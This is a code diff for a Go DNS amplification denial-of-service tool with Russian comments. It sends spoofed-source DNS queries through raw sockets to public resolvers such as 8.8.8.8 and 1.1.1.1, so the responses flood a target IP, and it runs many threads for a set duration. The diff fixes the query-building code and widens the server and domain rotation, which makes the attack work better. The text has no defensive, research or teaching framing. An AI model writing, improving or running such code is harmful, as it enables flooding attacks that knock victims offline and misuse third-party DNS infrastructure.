@@ -15,19 +15,19 @@ import (
 
 type Config struct {
 	targetIP   string
-	dnsServers []string // Множество DNS-серверов
-	domains    []string // Множество доменов
+	dnsServers []string
+	domains    []string
 	count      int
-	threads    int // Количество потоков
-	duration   int // Длительность в секундах
+	threads    int
+	duration   int
 }
 
 func main() {
 	banner := `
     ╔═══════════════════════════╗
-    ║   ┏━┓╻ ╻╺┓ ┏━┓┏━╸┏━┓╺┓ 	║
-	║	┗━┓┃╻┃ ┃ ┏━┛┣╸ ┏━┛ ┃ 	║
-	║	┗━┛┗┻┛╺┻╸┗━╸╹  ┗━╸╺┻╸   ║
+    ║   ┏━┓╻ ╻╺┓ ┏━┓┏━╸┏━┓╺┓    ║
+    ║   ┗━┓┃╻┃ ┃ ┏━┛┣╸ ┏━┛ ┃    ║
+    ║   ┗━┛┗┻┛╺┻╸┗━╸╹  ┗━╸╺┻╸   ║
     ║     DNS Amplification     ║
     ╚═══════════════════════════╝
     `
@@ -43,7 +43,6 @@ func main() {
 	fmt.Printf("Duration: %d seconds\n\n", cfg.duration)
 
 	var wg sync.WaitGroup
-	packetsPerThread := cfg.count / cfg.threads
 	startTime := time.Now()
 	endTime := startTime.Add(time.Duration(cfg.duration) * time.Second)
 
@@ -64,7 +63,7 @@ func main() {
 		wg.Add(1)
 		go func(threadID int) {
 			defer wg.Done()
-			cfg.attackThread(threadID, packetsPerThread, endTime, stats)
+			cfg.attackThread(threadID, endTime, stats)
 		}(i)
 	}
 
@@ -117,7 +116,7 @@ func (s *Stats) printStats(endTime time.Time) {
 	}
 }
 
-func (cfg *Config) attackThread(threadID, packets int, endTime time.Time, stats *Stats) {
+func (cfg *Config) attackThread(threadID int, endTime time.Time, stats *Stats) {
 	// Создаем RAW-сокет для этого потока
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
 	if err != nil {
@@ -126,11 +125,11 @@ func (cfg *Config) attackThread(threadID, packets int, endTime time.Time, stats 
 	}
 	defer syscall.Close(fd)
 
-	serverIndex := 0
-	domainIndex := 0
+	serverIndex := threadID % len(cfg.dnsServers)
+	domainIndex := threadID % len(cfg.domains)
 
 	for time.Now().Before(endTime) {
-		// Выбираем DNS-сервер и домен по кругу
+		// Выбираем DNS-сервер и домен
 		dnsServer := cfg.dnsServers[serverIndex]
 		domain := cfg.domains[domainIndex]
 
@@ -141,8 +140,14 @@ func (cfg *Config) attackThread(threadID, packets int, endTime time.Time, stats 
 			Addr: ipToArray(dnsIP),
 		}
 
-		// Создаем DNS-запрос
+		// Создаем DNS-запрос с правильным расчетом размера
 		dnsQuery := createDNSQuery(domain)
+		if dnsQuery == nil {
+			// Переходим к следующему домену при ошибке
+			domainIndex = (domainIndex + 1) % len(cfg.domains)
+			continue
+		}
+
 		udpHeader := createUDPHeader(10000+threadID, dnsPort, 8+len(dnsQuery))
 		udpPacket := append(udpHeader, dnsQuery...)
 		ipHeader := createIPHeader(cfg.targetIP, dnsIP.String(), len(udpPacket))
@@ -170,7 +175,7 @@ func parseFlags() *Config {
 
 	// Параметры по умолчанию для серьезной атаки
 	dnsServers := flag.String("dns", "8.8.8.8:53,1.1.1.1:53,9.9.9.9:53,8.8.4.4:53", "DNS servers (comma separated)")
-	domains := flag.String("domains", "google.com,youtube.com,facebook.com,amazon.com,microsoft.com", "Domains to query")
+	domains := flag.String("domains", "google.com,youtube.com,facebook.com,amazon.com,cloudflare.com,reddit.com,wikipedia.org,twitter.com,instagram.com,linkedin.com", "Domains to query")
 	flag.StringVar(&cfg.targetIP, "target", "192.168.1.100", "Target IP")
 	flag.IntVar(&cfg.count, "count", 100000, "Total packets to send")
 	flag.IntVar(&cfg.threads, "threads", 50, "Number of threads")
@@ -184,9 +189,6 @@ func parseFlags() *Config {
 
 	return cfg
 }
-
-// Остальные функции (parseDNSServer, ipToArray, createIPHeader, createUDPHeader, createDNSQuery, splitDomain, calculateChecksum)
-// остаются без изменений из предыдущего кода
 
 func parseDNSServer(server string) (net.IP, int) {
 	parts := strings.Split(server, ":")
@@ -239,47 +241,95 @@ func createUDPHeader(srcPort, dstPort, length int) []byte {
 	return header
 }
 
+// Исправленная функция createDNSQuery с правильным расчетом размера
 func createDNSQuery(domain string) []byte {
-	query := make([]byte, 12+len(domain)+5)
-	query[0] = 0xAA
+	// Сначала вычисляем точный размер нужного буфера
+	encodedLen := calculateEncodedDomainLength(domain)
+	if encodedLen == 0 {
+		return nil
+	}
+
+	// 12 байт - DNS заголовок, encodedLen - домен, 4 байта - тип и класс
+	totalLen := 12 + encodedLen + 4
+	query := make([]byte, totalLen)
+
+	// DNS заголовок
+	query[0] = 0xAA // ID
 	query[1] = 0xBB
-	query[2] = 0x01
+	query[2] = 0x01 // Флаги: стандартный запрос
 	query[3] = 0x00
-	query[4] = 0x00
+	query[4] = 0x00 // QDCOUNT = 1
 	query[5] = 0x01
+	// Остальные поля = 0
 	for i := 6; i < 12; i++ {
 		query[i] = 0x00
 	}
+
+	// Кодируем доменное имя
 	offset := 12
 	parts := splitDomain(domain)
 	for _, part := range parts {
+		if len(part) > 63 {
+			// Пропускаем слишком длинные части домена
+			continue
+		}
 		query[offset] = byte(len(part))
 		offset++
+		if offset+len(part) > len(query) {
+			return nil
+		}
 		copy(query[offset:], part)
 		offset += len(part)
 	}
-	query[offset] = 0x00
+	query[offset] = 0x00 // Конец домена
 	offset++
+
+	// Тип записи (A-record = 1)
+	if offset+3 >= len(query) {
+		return nil
+	}
 	query[offset] = 0x00
 	query[offset+1] = 0x01
+	// Класс (IN = 1)
 	query[offset+2] = 0x00
 	query[offset+3] = 0x01
+
 	return query
 }
 
+// Вычисляет длину закодированного доменного имени
+func calculateEncodedDomainLength(domain string) int {
+	parts := splitDomain(domain)
+	total := 0
+	for _, part := range parts {
+		if len(part) > 63 {
+			continue // Пропускаем слишком длинные части
+		}
+		total += 1 + len(part) // Байт длины + сама строка
+	}
+	total++ // Конечный нуль
+	return total
+}
+
+// Разделение домена на части
 func splitDomain(domain string) [][]byte {
 	var parts [][]byte
 	start := 0
 	for i, ch := range domain {
 		if ch == '.' {
-			parts = append(parts, []byte(domain[start:i]))
+			if i-start > 0 {
+				parts = append(parts, []byte(domain[start:i]))
+			}
 			start = i + 1
 		}
 	}
-	parts = append(parts, []byte(domain[start:]))
+	if start < len(domain) {
+		parts = append(parts, []byte(domain[start:]))
+	}
 	return parts
 }
 
+// Расчет контрольной суммы IP-заголовка
 func calculateChecksum(data []byte) uint16 {
 	var sum uint32
 	for i := 0; i < len(data); i += 2 {
